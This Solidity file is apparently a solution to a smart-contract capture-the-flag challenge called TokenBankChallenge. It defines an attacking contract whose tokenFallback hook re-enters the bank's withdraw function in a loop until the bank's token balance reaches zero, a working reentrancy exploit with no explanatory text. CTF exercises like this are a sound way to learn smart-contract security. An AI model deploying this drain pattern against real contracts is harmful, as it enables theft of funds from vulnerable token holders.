pragma solidity ^0.4.21;

import "../TokenBankChallenge.sol";


contract hackingTokenBankChallenge {
    TokenBankChallenge public bankContract;

    function hackingTokenBankChallenge(address _bankAddress) public {
        bankContract = TokenBankChallenge(_bankAddress);
    }

    function exploit() public {
        
        uint256 amount = bankContract.balanceOf(address(this));
        bankContract.withdraw(amount);
    }

    function bankDeposit(uint256 amount) public {
        bankContract.token().transfer(address(bankContract), amount);
    }

    function tokenFallback(address from, uint256 value, bytes) public {

        if (from != address(bankContract)) return;

        uint256 bankBalance = bankContract.token().balanceOf(address(bankContract));

        while(bankBalance > 0) {
            exploit();
            bankBalance = bankContract.token().balanceOf(address(bankContract));
        }
        
        require(bankBalance == 0);
    }
}